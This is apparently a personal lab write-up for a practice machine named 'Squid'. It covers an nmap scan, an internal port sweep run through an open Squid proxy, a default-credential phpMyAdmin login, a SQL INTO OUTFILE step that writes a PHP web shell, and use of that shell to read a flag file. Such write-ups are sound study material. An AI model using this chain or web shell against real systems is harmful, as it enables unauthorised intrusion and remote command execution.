---
tags: [ProvingGround]
---

Squid 5/24/25

-------------------------------

## 1. sudo nmap -p- -sC -sV -Pn -n --open 192.168.189.189 -oN nmap/initial
Nmap scan report for 192.168.189.189
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3128/tcp  open  http-proxy    Squid http proxy 4.14
|_http-server-header: squid/4.14
|_http-title: ERROR: The requested URL could not be retrieved
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

## Host script results
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2025-05-24T18:08:33
|_  start_date: N/A

## 2. Searched around from exploits for Squid http proxy 4.14. Noting immediately jumped out.
## 3. Since Squid Http Proxy running, ran check to see if ports were available on the internal device. Ran following script and then searched for 200s.

for port in  $(seq 1 65000); do
echo -n "Testing port $port: " >> results.txt
```bash
curl -s -o /dev/null -w "%{http_code}\n" -x http://192.168.189.189:3128 http://127.0.0.1:$port >> results.txt
```
done

Found these two ports.

Testing port 3306: 200
Testing port 8080: 200

## 4. Congigured browser proxy with 192.168.189.189.3128
## 5. Went to 127.0.0.1:8080. Discovered WAMP server with link to myphpadmin()
## 6. Logged into myphpadmin() with default creds root/blank
## 7. Found document root info in phpsysinfo()
## 8. SELECT "<?php system($_GET['cmd']); ?>"
INTO OUTFILE '/wamp/www/shell.php';
## 8. http://127.0.0.1:8080/shell.php?cmd=whoami
nt/system
## 9. http://127.0.0.1:8080/shell.php?cmd=type%20C:\Users\Administrator\Desktop\proof.txt
aba5bff4d7f288aa9b189f45b415bc78